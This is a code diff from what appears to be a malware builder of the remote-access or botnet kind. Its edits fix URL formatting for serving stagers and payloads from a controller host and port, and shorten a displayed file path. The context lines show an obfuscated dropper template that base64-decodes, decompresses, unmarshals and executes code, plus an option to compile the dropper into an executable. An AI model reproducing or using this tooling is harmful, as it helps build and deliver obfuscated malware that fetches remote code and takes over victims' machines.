@@ -351,7 +351,7 @@ except ImportError: pass
         with open(path, 'w') as fp:
             fp.write(payload)
          
-        s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
+        s = 'http://{}:{}{}'.format(options.host, int(options.port) + 1, pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
         s = urlparse.urlsplit(s)
         url = urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
 
@@ -412,7 +412,7 @@ def _stager(options, **kwargs):
         with open(path, 'w') as fp:
             fp.write(stager)
 
-        s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
+        s = 'http://{}:{}{}'.format(options.host, int(options.port) + 1, pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
         s = urlparse.urlsplit(s)
         url = urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
 
@@ -461,8 +461,7 @@ exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))""".format(repr(
 
     with open(path, 'w') as fp:
         fp.write(dropper)
-
-    util.display('({:,} bytes written to {})'.format(len(dropper), path), style='dim', color='reset')
+    util.display('({:,} bytes written to {})'.format(len(dropper), path.replace(os.getcwd(), '')), style='dim', color='reset')
 
     if options.freeze:
         util.display('\tCompiling executable...\n', color='reset', style='normal', end=' ')
